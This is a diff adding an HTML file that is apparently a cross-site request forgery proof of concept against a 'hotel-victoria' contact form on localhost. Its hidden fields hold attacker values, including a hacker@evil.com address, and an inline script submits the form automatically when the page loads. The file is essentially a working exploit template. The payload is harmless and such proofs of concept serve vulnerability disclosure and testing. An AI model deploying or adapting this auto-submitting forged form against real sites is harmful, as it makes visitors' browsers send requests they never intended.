@@ -1,0 +1,15 @@
+<html>
+<body>
+<form action="http://localhost/hotel-victoria/front-end/Pages/contact.php" method="POST">
+    <input type="hidden" name="action" value="send_message">
+    <input type="hidden" name="contact_full_name" value="Hacker">
+    <input type="hidden" name="contact_email" value="hacker@evil.com">
+    <input type="hidden" name="contact_subject" value="other">
+    <input type="hidden" name="contact_message" value="Exploited!">
+    <input type="submit">
+</form>
+<script>
+    document.forms[0].submit();
+</script>
+</body>
+</html>
